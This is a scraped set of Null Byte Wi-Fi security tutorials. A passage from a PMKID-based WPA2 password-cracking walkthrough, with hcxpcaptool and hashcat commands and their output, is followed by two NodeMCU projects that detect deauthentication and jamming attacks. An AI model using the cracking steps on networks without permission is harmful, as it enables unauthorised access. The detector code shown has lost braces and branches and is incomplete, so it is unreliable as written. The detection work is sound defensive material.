fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:20:02 - 008] 14edbbd29326 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:20:04 - 008] 1c872c707c60 -> 78e7d17791e7 [FOUND PMKID]\n[22:20:11 - 009] e0220453a576 -> fcc233ca8bc5 [FOUND PMKID CLIENT-LESS]\n[22:20:27 - 001] ace2d32602da -> c8665d5dd654 [FOUND HANDSHAKE AP-LESS, EAPOL TIMEOUT 5202]\nINFO: cha=2, rx=32752, rx(dropped)=2801, tx=2205, powned=18, err=0\nWhen you've gathered enough, you can stop the program by typing Control-C to end the attack. This should produce a PCAPNG file containing the information we need to attempt a brute-forcing attack, but we will need to convert it into a format Hashcat can understand.\nStep 4: Use Hxcpcaptool to Convert the Dump for Hashcat\nTo convert our PCAPNG file, we'll use hcxpcaptool with a few arguments specified. In the same folder that your .PCAPNG file is saved, run the following command in a terminal window.\n~# hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng\nThis command is telling hxcpcaptool to use the information included in the file to help Hashcat understand it with the -E, -I, and -U flags. The -Z flag is used for the name of the newly converted file for Hashcat to use, and the last part of the command is the PCAPNG file we want to convert.\nRunning the command should show us the following.\nfile name....................: galleria.pcapng\nfile type....................: pcapng 1.0\nfile hardware information....: x86_64\nfile os information..........: Linux 4.18.0-kali2-amd64\nfile application information.: hcxdumptool 4.2.1\nnetwork type.................: DLT_IEEE802_11_RADIO (127)\nendianess....................: little endian\nread errors..................: flawless\npackets inside...............: 1089\nskipped packets..............: 0\npackets with GPS data........: 0\npackets with FCS.............: 732\nbeacons (with ESSID inside)..: 49\nprobe requests...............: 26\nprobe responses..............: 40\nassociation requests.........: 103\nassociation responses........: 204\nreassociation requests.......: 2\nreassocaition responses......: 7\nauthentications (OPEN SYSTEM): 346\nauthentications (BROADCOM)...: 114\nauthentications (APPLE)......: 1\nEAPOL packets................: 304\nEAPOL PMKIDs.................: 21\nbest handshakes..............: 4 (ap-less: 1)\n21 PMKID(s) written to galleriahC.16800\nHere, we can see we've gathered 21 PMKIDs in a short amount of time. Now we can use the \"galleriaHC.16800\" file in Hashcat to try cracking network passwords.\n* Don't Miss: Protect Yourself from the KRACK Attacks WPA2 Wi-Fi Vulnerability\nStep 5: Select a Password List & Brute Force with Hashcat\nTo start attacking the hashes we've captured, we'll need to pick a good password list. You can find several good password lists to get started over at the SecList collection. Once you have a password list, put it in the same folder as the .16800 file you just converted, and then run the following command in a terminal window.\n~# hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt'\nIn this command, we are starting Hashcat in 16800 mode, which is for attacking WPA-PMKID-PBKDF2 network protocols. Next, we'll specify the name of the file we want to crack, in this case, \"galleriaHC.16800.\" The -a flag tells us which types of attack to use, in this case, a \"straight\" attack, and then the -w and --kernel-accel=1 flags specifies the highest performance workload profile. If your computer suffers performance issues, you can lower the number in the -w argument.\nNext, the --force option ignores any warnings to proceed with the attack, and the last part of the command specifies the password list we're using to try to brute force the PMKIDs in our file, in this case, called \"topwifipass.txt.\"\nhashcat (v4.2.1) starting...\nOpenCL Platform #1: The pocl project\n====================================\n* Device #1: pthread-AMD A8-6410 APU with AMD Radeon R5 Graphics, 2553/2553 MB allocatable, 4MCU\nHashes: 21 digests; 21 unique digests, 20 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nApplicable optimizers:\n* Zero-Byte\n* Slow-Hash-SIMD-LOOP\nMinimum password length supported by kernel: 8\nMaximum password length supported by kernel: 63\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n* Device #1: build_opts '-cl-std=CL1.1 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=16800 -D _unroll'\nDictionary cache hit:\n* Filename..: topwifipass.txt\n* Passwords.: 4801\n* Bytes.....: 45277\n* Keyspace..: 4801\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>\nDepending on your hardware speed and the size of your password list, this can take quite some time to complete. To see the status at any time, you can press the S key for an update.\nStep 6: Interpret the Results\nAs Hashcat cracks away, you'll be able to check in as it progresses to see if any keys have been recovered.\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: galleriaHC.16800\nTime.Started.....: Sun Oct 28 22:32:57 2018 (7 mins, 50 secs)\nTime.Estimated...: Sun Oct 28 22:57:50 2018 (17 mins, 3 secs)\nGuess.Base.......: File (topwifipass.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:      64 H/s (15.43ms) @ Accel:1 Loops:1024 Thr:1 Vec:4\nRecovered........: 0/21 (0.00%) Digests, 0/20 (0.00%) Salts\nProgress.........: 30180/96020 (31.43%)\nRejected.........: 0/30180 (0.00%)\nRestore.Point....: 1508/4801 (31.41%)\nCandidates.#1....: peter123 -> moneyman\nHWon.Dev.#1......: N/A\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: galleriaHC.16800\nTime.Started.....: Sun Oct 28 22:32:57 2018 (19 mins, 56 secs)\nTime.Estimated...: Sun Oct 28 22:57:54 2018 (5 mins, 3 secs)\nGuess.Base.......: File (topwifipass.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:      64 H/s (15.24ms) @ Accel:1 Loops:1024 Thr:1 Vec:4\nRecovered........: 0/21 (0.00%) Digests, 0/20 (0.00%) Salts\nProgress.........: 76736/96020 (79.92%)\nRejected.........: 0/76736 (0.00%)\nRestore.Point....: 3836/4801 (79.90%)\nCandidates.#1....: monopoli -> mercenary\nHWon.Dev.#1......: N/A\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>\nWhen the password list is getting close to the end, Hashcat will automatically adjust the workload and give you a final report when it's complete.\nApproaching final keyspace - workload adjusted.\nSession..........: hashcat\nStatus...........: Exhausted\nHash.Type........: WPA-PMKID-PBKDF2\nHash.Target......: hotspotcap.16800\nTime.Started.....: Sun Oct 28 18:05:57 2018 (3 mins, 49 secs)\nTime.Estimated...: Sun Oct 28 18:09:46 2018 (0 secs)\nGuess.Base.......: File (topwifipass.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:      42 H/s (15.56ms) @ Accel:1 Loops:1024 Thr:1 Vec:4\nRecovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts\nProgress.........: 9602/9602 (100.0%)\nRejected.........: 2/9602 (0.02%)\nRestore.Point....: 4801/4801 (100.0%)\nCandidates.#1....: 159159159 -> 00001111\nHWon.Dev.#1......: N/A\nStarted: Sun Oct 28 18:05:56 2018\nStopped: Sun Oct 28 18:09:49 2018\nIf you've managed to crack any passwords, you'll see them here. In our test run, none of the PMKIDs we gathered contained passwords in our password list, thus we were unable to crack any of the hashes. This will most likely be your result too against any networks with a strong password but expect to see results here for networks using a weak password.\nThe PMKID Hashcat Attack Makes Wi-Fi Attacks Easier\nWhile the new attack against Wi-Fi passwords makes it easier for hackers to attempt an attack on a target, the same methods that were effective against previous types of WPA cracking remain effective. If your network doesn't even support the robust security element containing the PMKID, this attack has no chance of success. You can audit your own network with hcxtools to see if it is susceptible to this attack.\nEven if your network is vulnerable, a strong password is still the best defense against an attacker gaining access to your Wi-Fi network using this or another password cracking attack.\nBecause these attacks rely on guessing the password the Wi-Fi network is using, there are two common sources of guesses; The first is users picking default or outrageously bad passwords, such as \"12345678\" or \"password.\" These will be easily cracked. The second source of password guesses comes from data breaches that reveal millions of real user passwords. Because many users will reuse passwords between different types of accounts, these lists tend to be very effective at cracking Wi-Fi networks.\nI hope you enjoyed this guide to the new PMKID-based Hashcat attack on WPA2 passwords! If you have any questions about this tutorial on Wi-Fi password cracking or you have a comment, feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Detect & Classify Wi-Fi Jamming Packets with the NodeMCU",
        "link": "https://null-byte.wonderhowto.com/how-to/detect-classify-wi-fi-jamming-packets-with-nodemcu-0188668/",
        "content": "* WonderHowTo\nThe most common Wi-Fi jamming attacks leverage deauthentication and disassociation packets to attack networks. This allows a low-cost ESP8266-based device programmed in Arduino to detect and classify Wi-Fi denial-of-service attacks by lighting a different color LED for each type of packet. The pattern of these colors can also allow us to fingerprint the tool being used to attack the network.\nTypes of Jamming Attacks\nJammers used in electronic warfare typically require equipment that overwhelms the signal of the target with radio energy, making it impossible to distinguish between the signal and the noise being introduced to the channel the target is using to communicate; This kind of jamming is popular because it works, but it also requires specialized equipment that is banned or heavily regulated in most countries.\nAnother type of jamming attempts to send messages that force the target to be disconnected from the network they are connected to, rather than drowning out a target's signal by trying to overwhelm it. You might think this kind of attack might only work if you are connected to the network, but this is where WPA has a severe flaw. Because so-called management frames are not encrypted, it is possible to send disruptive messages from outside the network which causes people inside the network to be unable to connect.\nDeauthentication Packets\nThe most common way this sort of attack is done is with deauthentication packets. These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks, as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking.\n* Don't Miss: Detect Wi-Fi Jamming Attacks with a NodeMCU Monitor\nAside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network.\nDissasociation Packets\nDisassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily that an AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area.\nCommon Wi-Fi Denial of Service Tools\nThere are many different tools to attack Wi-Fi networks, and many of them just automate more basic tools like Aireplay-ng and MDK3. We've covered both using and detecting both tools before, but in this example, we'll be setting a few design goals for detecting attacks against a network. To do that, we need to understand the way each work to effectively jam a Wi-Fi network.\nAireplay-ng is often used to disconnect clients momentarily to obtain a Wi-Fi handshake, and it uses forged deauthentication packets to disconnect any networks or clients the user specifies either with a set number of deauthentication packets, or a continuous stream. It's also used in frameworks like Airgeddon, which allow the results of scans to automatically be fed into Aireplay to actively attack any networks discovered in an area in real time.\nMDK3 uses a blend of disassociation and deauthentication packets, initially having a slower onset than an Aireplay-ng attack. This attack is also used in frameworks like Airgeddon, and it can be differentiated by the alternating pattern of deauthentication and disassociation packets it sends.\nTweaking the Deauth Detector\nTo design a detector, I looked to find a script for the NodeMCU to base our design off of. I found Spacehuhn's DeauthDetector, which is a sketch in Arduino for ESP8266 devices like the NodeMCU that turns on an LED when a certain number of deauthentication or disassociation packets are detected. This is another of Spacehuhn's excellent designs, and you should check out his website (disable ad blockers) to see more of his ESP8266-based projects.\nInside the DeauthDetector code, I found exactly what I needed to use an LED to show the type of attack underway, rather than just turning on a light when an attack is present.\nif(buf[12] == 0xA0 || buf[12] == 0xC0){\nThis line may look similar if you followed our guide to using Wireshark to do the same thing. That's because the capture filter we used to find deauthentication and disassociation packets looks at the same elements, so we can split this code that looks for both into two different sections, one for managing a variable that tracks each kind of packet and turns on a corresponding LED to alert the user.\nWhat You'll Need\nTo build this detector, you'll need a NodeMCU or ESP8266-based device. You'll also need a computer running Arduino IDE to program it, and either a three-color (RGB), four-pin LED or at least two LEDs to indicate when a packet of each type is detected. You'll need a breadboard to wire this all together as well, and it's recommended you use a resistor or potentiometer to avoid burning out your LED.\nHere's a list of what I ended up using:\n* ESP8266 NodeMCU CP2102 development board wireless module (less than $6 per unit)\n* Solderless breadboard kit with jumper wires (around $11, but you can probably find a single breadboard with a few jumpers for less)\n* Tricolor LED (around $9 for a bunch, but you can get just one at a local store for super cheap)\n* Micro-USB cable (you probably already have one of these)\n* Resistors (optional, if you want the LED to last longer)\nStep 1: Download & Configure Arduino IDE\nThe free, cross-platform Arduino IDE will allow us to quickly prototype what we need. Arduino IDE (the IDE stands for \"integrated development environment\") allows you to quickly write and upload scripts to Arduino-like microcontroller devices.\nYou can download the Arduino IDE from the official website. Once it's installed, you'll need to click on the \"Arduino\" drop-down menu, then select \"Preferences.\" Next, paste the following URL into the Additional Boards Manager URLs field. Click \"OK\" to continue.\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json\nNext, you'll need to add the NodeMCU to the Boards Manager. To do this, you'll need to click on \"Tools,\" then hover over the \"Board\" section to see the drop-down list of supported boards. At the top, click \"Boards Manager\" to open the window that will allow us to add more boards.\nWhen the Boards Manager window opens, type \"esp8266\" into the search bar. Select \"esp8266\" by \"ESP8266 Community,\" and install it to add support for the NodeMCU to your Arduino IDE.\nOnce this is done, you should be ready to program your NodeMCU. Plug your NodeMCU into your breadboard and your NodeMCU into the computer. When you click on \"Tools,\" you should see the correct port auto-selected. Select the \"NodeMCU 1.0.\"\nIf you're using a bad cable, the port may not show up, so if you don't see anything after you've completed the other steps, try another cable first.\nStep 2: Download the DeauthDetector\nNow that we have our IDE set up, we can download Spacehuhn's DeauthDetector to get started modifying the code. You can download the original version here if you'd like to follow along, but I'll be using my forked version below for our example.\nIn a terminal window, type the following to download the modified DeauthDetector, change to its directory, and list the contents.\ngit clone https://github.com/skickar/DeauthDetector.git\ncd DeauthDetector\nOnce inside the new folder containing the downloaded files, you'll see an INO sketch file and two libraries that we will need for the project to work. Open the INO file in Arduino IDE, then click on \"Sketch\" in the menu at the top. Select \"Add File\" to select the two libraries we downloaded along with the INO file. Make sure to add mac.cpp and mac.h or our code will fail.\nOnce we have the library added, we can push the code to our NodeMCU, but let's take a look inside the code and see how it works.\nStep 3: Tweak the Deauth Detector Code\nFirst and most obviously, we have our main settings. There are a collection of definitions that dictate how the code functions. Here, we can define whether or not we want to channel hop or just stay on one channel by setting the \"channelHopping\" setting to \"true.\"\nDepending on where we are, we can define the highest channel to scan to while channel hopping (Japan is 14, while the US only goes to 11), and the number of packets detected per minute which we will decide an attack is underway. Because we are tweaking the detector, this won't be so important.\n//===== SETTINGS =====//\n#define channel 1 //the channel it should scan on (1-14)\n#define channelHopping true //scan on all channels\n#define maxChannel 13 //US = 11, EU = 13, Japan = 14\n#define ledPin 2 //led pin ( 2 = built-in LED)\n#define inverted false // invert HIGH/LOW for the LED\n#define packetRate 3 //min. packets before it gets recognized as an attack\nNext, we have a series of variables which keep track of things in the script. I've added two variables to keep track of deauthentication and disassociation packets, creatively named \"dissoc\" and \"deauth.\"\n#define scanTime 500 //scan time per channel in ms\n//Mac from;\nunsigned long c = 0;\nunsigned long deauth = 0;\nunsigned long dissoc = 0;\nunsigned long prevTime = 0;\nunsigned long curTime = 0;\nint curChannel = channel;\nNext, we have a sniffer function, and an \"if\" statement that adds to the \"c\" counter, which is counting how many deauthentication or disassociation packets we have received. I've commented this out because we will be tracking them individually.\nvoid sniffer(uint8_t *buf, uint16_t len) {\n/*    if(buf[12] == 0xA0 || buf[12] == 0xC0){\nInstead, we'll insert two \"if\" statements that will add to a cooldown timer. Whenever we detect disassociation packets, we'll turn on an LED by setting the cooldown timer to 500, and then subtract one from the timer one each time we scan a packet that isn't a dissociation packet. This means the light will stay on continuously when an attack is underway and turn off as soon as the attack stops and normal traffic resumes. The same logic is true for deauthentication packets, which we track in the second \"if\" statement.\nif(buf[12] == 0xA0){\ndissoc = 500;\nif(buf[12] == 0xC0){\ndeauth = 500;\nNow, we'll decide what happens when the packet doesn't match, meaning it's a normal Wi-Fi packet and not one we're looking for. To handle this, we'll use an \"else\" clause that says that if the cooldown timer for \"deauth\" or \"dissoc\" is equal to or greater than one, subtract one from the timer. Otherwise, if the timer is already at zero, do nothing.\nif (deauth >= 1){\nif (dissoc >= 1){\nIn our setup loop, we'll set up our pins for output mode and Spacehuhn's sniffer functions get to work scanning for packets. We specify we want to turn on pins D5, D6, and D7 with the pinMode(pin, mode) function, in this case turning the pins on for output mode. This code will let us control the LEDs from these pins.\nvoid setup() {\nSerial.begin(115200);\nwifi_set_opmode(STATION_MODE);\nwifi_promiscuous_enable(0);\nWiFi.disconnect();\nwifi_set_promiscuous_rx_cb(sniffer);\nwifi_set_channel(curChannel);\nwifi_promiscuous_enable(1);\npinMode(D5, OUTPUT);\npinMode(D6, OUTPUT);\npinMode(D7, OUTPUT);\nNow, we have our main loop, the part of the code that runs over and over again. In this section of the code, we define the time and define the logic that actually turns on the LEDs.\nvoid loop() {\ncurTime = millis();\nif(curTime - prevTime >= scanTime){\nprevTime = curTime;\nIn this section, we set up what happens depending on the value of our cooldown timer, which starts at zero but gets set to 500 each time there is a deauthentication or disassociation packet. Each is tracked separately and one is subtracted from each every time a normal packet is detected if the cooldown timer isn't already zero. Here, we simply say that if the cooldown timer is one or more, turn on the LED by turning the corresponding pin high. Also included is the logic for inverting the LED, which you can set true or false at the beginning.\nif(deauth >= 1){\nif(inverted) digitalWrite(D5, LOW);\nelse digitalWrite(D5, HIGH);}\nif(inverted) digitalWrite(D5, HIGH);\nelse digitalWrite(D5, LOW);\nif(dissoc >= 1){\nif(inverted) digitalWrite(D7, LOW);\nelse digitalWrite(D7, HIGH);\nif(inverted) digitalWrite(D7, HIGH);\nelse digitalWrite(D7, LOW);\nFinally, we say that if the value of the cooldown timer is \"else\" (in this case, less than one), to turn off the LED. This is the last of our modifications, and the last part of the code controls the channel hopping and sets the NodeMCU to scan on the next channel, assuming channel hopping is enabled.\nif(channelHopping){\ncurChannel++;\nif(curChannel > maxChannel) curChannel = 1;\nwifi_set_channel(curChannel);\nThe final code should look like this:\n#include <ESP8266WiFi.h>\n#include \"Mac.h\"\nextern \"C\" {\n#include \"user_interface.h\"\n//===== SETTINGS =====//\n#define channel 1 //the channel it should scan on (1-14)\n#define channelHopping true //scan on all channels\n#define maxChannel 13 //US = 11, EU = 13, Japan = 14\n#define ledPin 2 //led pin ( 2 = built-in LED)\n#define inverted false // invert HIGH/LOW for the LED\n#define packetRate 3 //min. packets before it gets recognized as an attack\n#define scanTime 500 //scan time per channel in ms\nunsigned long deauth = 0;\nunsigned long dissoc = 0;\nunsigned long prevTime = 0;\nunsigned long curTime = 0;\nint curChannel = channel;\nvoid sniffer(uint8_t *buf, uint16_t len) {\nif(buf[12] == 0xA0){\ndissoc = 500;\nif(buf[12] == 0xC0){\ndeauth = 500;\nif (deauth >= 1){\nif (dissoc >= 1){\nvoid setup() {\nSerial.begin(115200);\nwifi_set_opmode(STATION_MODE);\nwifi_promiscuous_enable(0);\nWiFi.disconnect();\nwifi_set_promiscuous_rx_cb(sniffer);\nwifi_set_channel(curChannel);\nwifi_promiscuous_enable(1);\npinMode(D5, OUTPUT);\npinMode(D6, OUTPUT);\npinMode(D7, OUTPUT);\nSerial.println(\"starting!\");\nvoid loop() {\ncurTime = millis();\nif(curTime - prevTime >= scanTime){\nprevTime = curTime;\nSerial.println((String)c);\nif(deauth >= 1){\nif(inverted) digitalWrite(D5, LOW);\nelse digitalWrite(D5, HIGH);}\nif(inverted) digitalWrite(D5, HIGH);\nelse digitalWrite(D5, LOW);\nif(dissoc >= 1){\nif(inverted) digitalWrite(D7, LOW);\nelse digitalWrite(D7, HIGH);\nif(inverted) digitalWrite(D7, HIGH);\nelse digitalWrite(D7, LOW);\nif(channelHopping){\ncurChannel++;\nif(curChannel > maxChannel) curChannel = 1;\nwifi_set_channel(curChannel);\nWhen the modifications are complete (or when you're ready since it's already done in our example), you can press the arrow icon in the top left of Arduino IDE to push your code to the NodeMCU.\nStep 4: Wire & Test the Modified DeauthDetector\nOnce you have the code pushed to the NodeMCU, you can wire your four-pin, three-color RGB LED in one of two ways. Most direct is plugging it directly next to the D5, D6, D7, and ground pins on the mini breadboard. This works great, and probably won't burn out the LED, but to be safe, you may want to use a resistor in your design.\nTo include a resistor, place it between the ground pin and whichever ground pin you are using on the NodeMCU.\nOnce this is wired, you should be ready to go!\nFollow our guides to using MDK3 and Airplay-ng to fire off some hostile packets against a network you have permission to, and see if the LED lights up in response. In addition, watch for patterns in the colors that appear, as they'll directly reflect the behavior of the program being used.\nYou can check our guide on launching Wi-Fi denial of service attacks below. Be warned, these attacks are very illegal against networks you don't have permission to test, so make sure you have permission before doing so.\n* More Info: Use MDK3 for Advanced Wi-Fi Jamming\nHandheld Wi-Fi Jamming Detector\nThis tool is a great way of visualizing Wi-Fi attacks and allows anyone to see when an attack is present and what kind of Wi-Fi packets are involved with a minimum of work. Rather than needing Wireshark running to see what's going on around you, this simple project shows whether an attack is in progress and, if so, what kind of attack is being used.\nI hope you enjoyed this guide to detecting and classifying Wi-Fi jamming attacks with the NodeMCU. If you have any questions about this tutorial on detecting Wi-Fi attacks or you have a comment, feel free to reach me on Twitter @KodyKinzie.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Program a $6 NodeMCU to Detect Wi-Fi Jamming Attacks in the Arduino IDE",
        "link": "https://null-byte.wonderhowto.com/how-to/program-6-nodemcu-detect-wi-fi-jamming-attacks-arduino-ide-0186356/",
        "content": "* WonderHowTo\nHackers and makers are often grouped under the same label. While hackers draw on computer science skills to write programs and find bugs, makers use electrical engineering to create hardware prototypes from microprocessor boards like the Arduino. We'll exercise both sets of skills to program a $6 NodeMCU to display the status of a Wi-Fi link via an LED, allowing us to monitor for jamming attacks.\nWhile it's easy to launch attacks against Wi-Fi, detecting most attacks is relatively straightforward as well. Under normal circumstances, IoT devices can easily connect to a Wi-Fi network and perform useful functions. During a jamming attack, devices like smart speakers or connected Wi-Fi cameras are most vulnerable, as they lack a backup Ethernet link.\nTo spot such attacks, we can leverage a low-cost IoT device like a NodeMCU to act as a \"canary in a coal mine\" to warn us if connecting to a particular Wi-Fi network becomes impossible. Rather than checking for upstream connectivity, we'll program a simple detector that tries to connect to a monitored Wi-Fi network and changes an LED indicator to let us know if a standard connection is not possible.\n* Don't Miss: This Simple Arduino Hack Opens Millions of Hotel Keycard Doors\nDesigning the Detector\nThe first step of our project is to decide what our hardware prototype is supposed to do. Because most Wi-Fi-related attacks abuse management frames to make a standard connection impossible, checking the status of the Wi-Fi link of an IoT device is a way we can test the overall ability of devices to connect. To keep things simple on our first project, we will be creating a link monitor focusing on checking the ability of a Wi-Fi device to maintain a regular connection to a network. If it cannot, we will generate an alert to warn that there is a problem with the network.\nBecause we are not attempting to connect and check network connectivity, there are a few limitations to this tactic. First, we will not be alerted (or get false positives) if the router isn't able to connect to the internet, but the Wi-Fi link between the router and the detector is okay.\nSecond, we are not looking for the telltale signs of deauthentication and disassociation frames; While we will cover this in a future build, the design we will make is more straightforward and will also be triggered by more subtle jamming attacks.\n* Don't Miss: How to Use MDK3 for Advanced Wi-Fi Jamming\nOf course, if an attacker filters their jamming attacks to attack only other devices on the network and leaves the \"canary\" alone, then the detector will always have a valid Wi-Fi link and continue to signal the link is okay even if other devices cannot connect.\nIn a future build, we will create a deauthentication and disassociation packet detector that will be able to detect common deauth attacks in the area. For now, we will start our journey as a maker with a more simple design to understand how IoT programming works. We'll start by looking at the underlying hardware.\nThe ESP8266 Chip\nThe ESP8266 Wi-FI radio chip has been well-known among makers for its intriguing combination of relatively powerful, hackable hardware and a low price point. Makers began noticing and documenting this chip, allowing for the eventual inclusion of support for the ESP8266 in Arduino IDE. Simple Arduino-like devices using this Wi-Fi radio can be easily programmed to use Wi-Fi to do anything a maker can imagine. From this chip, a few popular types of firmware emerged, including the NodeMCU and Arduino ESP8266 Core.\nThe NodeMCU\nOne Arduino-like device that has become popular with makers developing prototypes is the NodeMCU devkit 1.0. This inexpensive board, which I've seen go for anywhere between $5 and $9 each unit, is based around the ESP8266. It can be programmed in a variety of well-documented languages, like Arduino, Lua, and MicroPython, allowing virtually anyone to get started creating Wi-Fi-connected IoT devices using it, a breadboard, and any number of other electronics to be controlled via Wi-Fi. By just plugging a NodeMCU into a breadboard, a beginner can learn to control and blink LED lights of different color combinations in only a few minutes.\nGet It on Amazon: ESP8266 NodeMCU CP2102 Wi-Fi Internet Development Board Wireless Module\nWhen a programmer writes their first program, it's traditional to write \"Hello world\" as the first output. In the maker community, the equivalent right of passage is to make an LED blink. For our prototype, we'll need the NodeMCU to tell us if it's no longer able to connect normally, meaning we'll need some indicator to let us know if there is trouble with the connection ability. To do this, we can use the onboard LED on the NodeMCU, which is blue and turns on and off. Alternatively, we could use a three-color RGB LED to give us some more options for our warning display.\n* Don't Miss: Build a Software-Based Wi-Fi Jammer with Airgeddon\nIn this guide, we will be using a four-pin RGB LED to blink blue when trying to find a connection, green when the connection is normal, and red when the connection is being interfered with or the network is taken down.\nParts Needed for This Guide\nI've already laid out the parts needed for this guide above, but to make it super clear, here's what I ended up using:\n* ESP8266 NodeMCU CP2102 Wi-Fi Internet Development Board Wireless Module (Less than $6 per unit.)\n* Solderless Breadboard Kit with Jumper Wires (Around $11, but you can probably find a single breadboard with a few jumpers for less.)\n* Tricolor RGB LED (Around $9 for a bunch, but you can get just one at a local store for super cheap.)\n* Micro USB Cable (You probably already have one of these.)\n* Resistors (Optional, if you want the LED to last longer.)\nStep 1: Set Up the Arduino IDE\nThere are several languages in which you can program a NodeMCU, and depending on your background, you can use whichever you are most comfortable with. In this guide, we will use the free and cross-platform Arduino IDE, which will allow us to quickly prototype what we need. Arduino IDE (the IDE stands for \"integrated development environment\") allows you to quickly write and upload scripts to Arduino-like microcontroller devices.\nYou can download the Arduino IDE from the official website. Once you've downloaded and installed it, you'll need to click on the \"Arduino\" drop-down menu, then select \"Preferences\" from the menu that appears.\nIn the \"Preferences\" menu that opens, paste the following URL into the \"Additional Boards Manager URLs\" field. Once that's complete, click \"OK\" to close the menu.\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json\nStep 2: Configure the Arduino IDE for the ESP8266\nNext, you'll need to add the NodeMCU to the Boards Manager. To do this, you'll need to click on \"Tools,\" then hover over the \"Board\" section to see the drop-down list of supported boards. At the top, click \"Boards Manager\" to open the window that will allow us to add more boards.\nWhen the Boards Manager window opens, type \"esp8266\" into the search bar. Select \"esp8266\" by \"ESP8266 Community,\" and install it to add support for the NodeMCU to your Arduino IDE.\nOnce this is done, you should be ready to program your NodeMCU. Plug your NodeMCU into your breadboard, and your NodeMCU into the computer. When you click on \"Tools,\" you should see the correct port auto-selected. Select the \"NodeMCU 1.0\" as shown in the image below. If you're using a bad cable, the port may not show up, so if you don't see anything after you've completed the other steps, try another cable first.\nThere are two main buttons at the top. One compiles and checks our code for mistakes before uploading it, and the second icon that looks like an arrow pushes the code to the NodeMCU.\nStep 3: Wire the NodeMCU to an LED\nOur first challenge will be getting the NodeMCU to blink a particular color when we tell it to, allowing us to use an RGB LED to indicate the status of something we can't see — the Wi-Fi connection. Let's write some code to blink an LED!\nThe kind of RGB LED we'll be using is very simple to control. We have a ground pin that's longer than the other pins, and then one pin for each color, red, green, and blue.\nLooking at the top of the NodeMCU, you'll notice the pins are labeled. The D0 through D8 pins we can program to control an LED, while the GND (ground) pin lets us connect the ground pin of the LED, completing the circuit and allowing the LED to light up. We will plug the RGB LED in next to the GND, D5, D6, and D7 pins on the NodeMCU, with the longer pin connected to the GND position. We'll need to map each pin to a color, so that in our program, when we tell a pin to turn on, it will turn on that particular color.\nTo understand how a breadboard is used to connect pins, take a look at this image of the back side of a full-sized breadboard. Here, you can see that the rows in the center are connected, while the columns at each edge are connected for applying power and ground.\nThe connections of a breadboard. Image by Florian Schäffer/Wikipedia Commons\nWe will plug the LED's pins into the breadboard next to the corresponding pins on the NodeMCU, as seen in the picture below with our mini-breadboard. This smaller breadboard lacks the columns seen on the sides of the full breadboard pictured above.\nIf you have resistors, you can extend the life or your LED's by putting them in between the pin and the LED. While not strictly necessary, connecting the LED without a resistor isn't technically the best way to do this as it can burn out the LED eventually, but it is by far the fastest way to get started.\nIf you can spare the resistors, the space on your breadboard, and some wires for the red, green, and blue connections, you can assemble the board as seen below. Instead of plugging in the LED directly to the pins, use a resistor to sit in-between the voltage from each pin and the LED, except for the ground pin. After doing so, you can connect directly to the LED's ground pin without a resistor.\nWith the LED plugged into either configuration, it's time to flash some code and get the LEDs to light up.\nStep 4: Write a Simple Program for the NodeMCU\nTo test the connections and set up our colors, we'll use a basic program to blink the LED different colors. You can see the code we'll use below.\nint highTime = 1000, lowTime = 100; // First, we define how long the light should be on (highTime) and how long the light should be off (lowTime) per blink in miliseconds (1000 = 1 sec)\nvoid red() { // Next, we create a function for the color red. You can expariment or swap these after testing them. For now, we will map pin D5 to our function \"red\"\ndigitalWrite(D5, HIGH), delay(highTime), digitalWrite(D5, LOW), delay(lowTime);\nvoid green() { // We will repeat this process for the color green. As a note, these are \"void\" functions because unlike normal functions they don't return any data, they just do something.\ndigitalWrite(D6, HIGH), delay(highTime), digitalWrite(D6, LOW), delay(lowTime);\nvoid blue() { // Finally, we create a function for the color blue as well.\ndigitalWrite(D7, HIGH), delay(highTime), digitalWrite(D7, LOW), delay(lowTime);\nvoid setup() { // This runs first to set up for our program, and only runs once. In this step, we will tun on the pins.\npinMode(D5, OUTPUT), pinMode(D6, OUTPUT), pinMode(D7, OUTPUT); // Here we turn on pins D5, D6, and D7 for output.\nvoid loop() { // This loop will run over and over.\nred(),green(),blue(); // Here, we call our 